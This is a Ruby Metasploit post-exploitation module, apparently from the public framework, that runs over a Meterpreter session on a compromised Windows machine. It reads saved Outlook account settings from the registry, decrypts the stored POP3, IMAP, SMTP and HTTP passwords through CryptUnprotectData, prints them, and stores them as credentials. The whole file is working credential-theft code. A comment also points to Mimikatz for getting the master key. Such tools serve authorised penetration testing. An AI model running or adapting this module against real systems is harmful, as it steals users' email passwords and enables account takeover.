# -*- coding: binary -*-

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Priv
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather Microsoft Outlook Saved Password Extraction',
        'Description' => %q{
          This module extracts and decrypts saved Microsoft
          Outlook (versions 2002-2010) passwords from the Windows
          Registry for POP3/IMAP/SMTP/HTTP accounts.
          In order for decryption to be successful, this module must be
          executed under the same privileges as the user which originally
          encrypted the password.
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'Justin Cacak' ], # Updated to work with newer versions of Outlook (2013, 2016, Office 365)
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [],
          'Reliability' => []
        },
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_railgun_api
              stdapi_sys_config_getuid
              stdapi_sys_process_attach
              stdapi_sys_process_get_processes
              stdapi_sys_process_getpid
              stdapi_sys_process_memory_allocate
              stdapi_sys_process_memory_read
              stdapi_sys_process_memory_write
            ]
          }
        }
      )
    )
  end

  def prepare_railgun
    if !session.railgun.get_dll('crypt32')
      session.railgun.add_dll('crypt32')
    end
  end

  def decrypt_password(data)
    pid = client.sys.process.getpid
    process = client.sys.process.open(pid, PROCESS_ALL_ACCESS)

    mem = process.memory.allocate(128)
    process.memory.write(mem, data)

    if session.sys.process.each_process.find { |i| i['pid'] == pid } ['arch'] == 'x86'
      addr = [mem].pack('V')
      len = [data.length].pack('V')
      ret = session.railgun.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 8)
      len, addr = ret['pDataOut'].unpack('V2')
    else
      addr = [mem].pack('Q')
      len = [data.length].pack('Q')
      ret = session.railgun.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 16)
      len, addr = ret['pDataOut'].unpack('Q2')
    end

    return '' if len == 0

    decrypted_pw = process.memory.read(addr, len)
    return decrypted_pw
  end

  # Just a wrapper to avoid copy pasta and long lines
  def get_valdata(key, name)
    registry_getvaldata("#{@key_base}\\#{key}", name)
  end

  def get_registry(outlook_ver)
    # Determine if saved accounts exist within Outlook.  Ignore the Address Book and Personal Folder registry entries.
    outlook_exists = 0
    saved_accounts = 0

    # Check for registry key based on Outlook version pulled from registry
    @key_base = "HKCU\\Software\\Microsoft\\Office\\#{outlook_ver}.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676"
    next_account_id = get_valdata('', 'NextAccountID')

    # Default to original registry key for module
    if next_account_id.nil?
      @key_base = 'HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676'
      next_account_id = get_valdata('', 'NextAccountID')
    end

    if !next_account_id.nil?
      # Microsoft Outlook not found

      print_status 'Microsoft Outlook found in Registry...'
      outlook_exists = 1
      registry_enumkeys(@key_base).each do |k|
        display_name = get_valdata(k, 'Display Name')

        if display_name.nil?
          # Microsoft Outlook found, but no account data saved in this location
          next
        end

        # Account found - parse through registry data to determine account type.  Parse remaining registry data after to speed up module.
        saved_accounts = 1
        got_user_pw = 0

        displayname = get_valdata(k, 'Display Name')
        email = get_valdata(k, 'Email')
        pop3_server = get_valdata(k, 'POP3 Server')
        smtp_server = get_valdata(k, 'SMTP Server')
        http_server_url = get_valdata(k, 'HTTP Server URL')
        imap_server = get_valdata(k, 'IMAP Server')
        smtp_use_auth = get_valdata(k, 'SMTP Use Auth')
        if !smtp_use_auth.nil?
          smtp_user = get_valdata(k, 'SMTP User')
          smtp_password = get_valdata(k, 'SMTP Password')
          smtp_auth_method = get_valdata(k, 'SMTP Auth Method')
        end

        if !pop3_server.nil?
          type = 'POP3'
        elsif !http_server_url.nil?
          type = 'HTTP'
        elsif !imap_server.nil?
          type = 'IMAP'
        else
          type = 'UNKNOWN'
        end

        # Decrypt password and output results.  Need to do each separately due to the way Microsoft stores them.
        print_good('Account Found:')
        print_status("     Type: #{type}")
        print_status("     User Display Name: #{displayname}")
        print_status("     User Email Address: #{email}")

        if type == 'POP3'
          pop3_pw = get_valdata(k, 'POP3 Password')
          pop3_user = get_valdata(k, 'POP3 User')
          pop3_use_spa = get_valdata(k, 'POP3 Use SPA')
          smtp_port = get_valdata(k, 'SMTP Port')

          print_status("     User Name: #{pop3_user}")
          if pop3_pw.nil?
            print_status('     User Password: <not stored>')
          else
            pop3_pw.slice!(0, 1)
            pass = decrypt_password(pop3_pw)
            print_status("     User Password: #{pass}")
            # Prepare data for creds
            got_user_pw = 1
            host = pop3_server
            user = pop3_user
          end

          if !pop3_use_spa.nil? # Account for SPA (NTLM auth)
            print_status('     Secure Password Authentication (SPA): Enabled')
          end

          print_status("     Incoming Mail Server (POP3): #{pop3_server}")

          pop3_use_ssl = get_valdata(k, 'POP3 Use SSL')
          if pop3_use_ssl.nil?
            print_status('     POP3 Use SSL: No')
          else
            print_status('     POP3 Use SSL: Yes')
          end

          pop3_port = get_valdata(k, 'POP3 Port')
          if pop3_port.nil?
            print_status('     POP3 Port: 110')
            portnum = 110
          else
            print_status("     POP3 Port: #{pop3_port}")
            portnum = pop3_port
          end

          if smtp_use_auth.nil? # Account for SMTP servers requiring authentication
            print_status("     Outgoing Mail Server (SMTP): #{smtp_server}")
          else
            print_status("     Outgoing Mail Server (SMTP): #{smtp_server}   [Authentication Required]")
            # Check if smtp_auth_method is null.  If so, the inbound credentials are utilized
            if smtp_auth_method.nil?
              smtp_user = pop3_user
              smtp_decrypted_password = pass
            else
              smtp_password.slice!(0, 1)
              smtp_decrypted_password = decrypt_password(smtp_password)
            end
            print_status("     Outgoing Mail Server (SMTP) User Name: #{smtp_user}")
            print_status("     Outgoing Mail Server (SMTP) Password: #{smtp_decrypted_password}")
          end

          smtp_use_ssl = get_valdata(k, 'SMTP Use SSL')
          if smtp_use_ssl.nil?
            print_status('     SMTP Use SSL: No')
          else
            print_status('     SMTP Use SSL: Yes')
          end

          if smtp_port.nil?
            print_status('     SMTP Port: 25')
            smtp_port = 25
          else
            print_status("     SMTP Port: #{smtp_port}")
          end

        elsif type == 'HTTP'
          http_password = get_valdata(k, 'HTTP Password')
          http_user = get_valdata(k, 'HTTP User')
          http_use_spa = get_valdata(k, 'HTTP Use SPA')

          print_status("     User Name: #{http_user}")
          if http_password.nil?
            print_status('     User Password: <not stored>')
          else
            http_password.slice!(0, 1)
            pass = decrypt_password(http_password)
            print_status("     User Password: #{pass}")
            got_user_pw = 1
            host = http_server_url
            user = http_user

            # Detect 80 or 443 for creds
            http_server_url.downcase!
            if http_server_url.include? "h\x00t\x00t\x00p\x00s"
              portnum = 443
            else
              portnum = 80
            end
          end

          if !http_use_spa.nil? # Account for SPA (NTLM auth)
            print_status('     Secure Password Authentication (SPA): Enabled')
          end

          print_status("     HTTP Server URL: #{http_server_url}")

        elsif type == 'IMAP'
          imap_user = get_valdata(k, 'IMAP User')
          imap_use_spa = get_valdata(k, 'IMAP Use SPA')
          imap_password = get_valdata(k, 'IMAP Password')
          smtp_port = get_valdata(k, 'SMTP Port')

          print_status("     User Name: #{imap_user}")
          if imap_password.nil?
            print_status('     User Password: <not stored>')
          else
            imap_password.slice!(0, 1)
            pass = decrypt_password(imap_password)
            print_status("     User Password: #{pass}")
            got_user_pw = 1
            host = imap_server
            user = imap_user
          end

          if !imap_use_spa.nil? # Account for SPA (NTLM auth)
            print_status('     Secure Password Authentication (SPA): Enabled')
          end

          print_status("     Incoming Mail Server (IMAP): #{imap_server}")

          imap_use_ssl = get_valdata(k, 'IMAP Use SSL')
          if imap_use_ssl.nil?
            print_status('     IMAP Use SSL: No')
          else
            print_status('     IMAP Use SSL: Yes')
          end

          imap_port = get_valdata(k, 'IMAP Port')
          if imap_port.nil?
            print_status('     IMAP Port: 143')
            portnum = 143
          else
            print_status("     IMAP Port: #{imap_port}")
            portnum = imap_port
          end

          if smtp_use_auth.nil? # Account for SMTP servers requiring authentication
            print_status("     Outgoing Mail Server (SMTP): #{smtp_server}")
          else
            print_status("     Outgoing Mail Server (SMTP): #{smtp_server}   [Authentication Required]")
            # Check if smtp_auth_method is null.  If so, the inbound credentials are utilized
            if smtp_auth_method.nil?
              smtp_user = imap_user
              smtp_decrypted_password = pass
            else
              smtp_password.slice!(0, 1)
              smtp_decrypted_password = decrypt_password(smtp_password)
            end
            print_status("     Outgoing Mail Server (SMTP) User Name: #{smtp_user}")
            print_status("     Outgoing Mail Server (SMTP) Password: #{smtp_decrypted_password}")
          end

          smtp_use_ssl = get_valdata(k, 'SMTP Use SSL')
          if smtp_use_ssl.nil?
            print_status('     SMTP Use SSL: No')
          else
            print_status('     SMTP Use SSL: Yes')
          end

          if smtp_port.nil?
            print_status('     SMTP Port: 25')
            smtp_port = 25
          else
            print_status("     SMTP Port: #{smtp_port}")
          end

        end

        if got_user_pw == 1
          service_data = {
            address: Rex::Socket.getaddress(host),
            port: portnum,
            protocol: 'tcp',
            service_name: type,
            workspace_id: myworkspace_id
          }

          credential_data = {
            origin_type: :session,
            session_id: session_db_id,
            post_reference_name: refname,
            username: user,
            private_data: pass,
            private_type: :password
          }

          credential_core = create_credential(credential_data.merge(service_data))

          login_data = {
            core: credential_core,
            access_level: 'User',
            status: Metasploit::Model::Login::Status::UNTRIED
          }

          create_credential_login(login_data.merge(service_data))
        end

        if !smtp_use_auth.nil?
          service_data = {
            address: Rex::Socket.getaddress(smtp_server),
            port: smtp_port,
            protocol: 'tcp',
            service_name: 'smtp',
            workspace_id: myworkspace_id
          }

          credential_data = {
            origin_type: :session,
            session_id: session_db_id,
            post_reference_name: refname,
            username: smtp_user,
            private_data: smtp_decrypted_password,
            private_type: :password
          }

          credential_core = create_credential(credential_data.merge(service_data))

          login_data = {
            core: credential_core,
            access_level: 'User',
            status: Metasploit::Model::Login::Status::UNTRIED
          }

          create_credential_login(login_data.merge(service_data))
        end

        print_status('')
      end
    end

    if outlook_exists == 0
      print_status('Microsoft Outlook not installed or Exchange accounts are being used.')
    elsif saved_accounts == 0
      print_status('Microsoft Outlook installed however no accounts stored in Registry.')
    end
  end

  def outlook_version
    val = registry_getvaldata('HKCR\\Outlook.Application\\CurVer', '')
    if !val.nil?
      idx = val.rindex('.')
      val[idx + 1..]
    end
  end

  def run
    # Get Outlook version from registry
    outlook_ver = outlook_version
    fail_with(Failure::NotFound, 'Microsoft Outlook version not found in registry.') if outlook_ver.nil?

    print_status("Microsoft Outlook Version: #{outlook_ver}")
    uid = session.sys.config.getuid # Get uid.  Decryption will only work if executed under the same user account as the password was encrypted.
    # **This isn't entirely true. The Master key and decryption can be retrieved using Mimikatz but it seems like more work than it's worth.

    if is_system?
      print_error("This module is running under #{uid}.")
      print_error('Automatic decryption will not be possible.')
      print_error('Migrate to a user process to achieve successful decryption (e.g. explorer.exe).')
    else
      print_status('Searching for Microsoft Outlook in Registry...')
      prepare_railgun
      get_registry(outlook_ver)
    end

    print_status('Complete')
  end
end
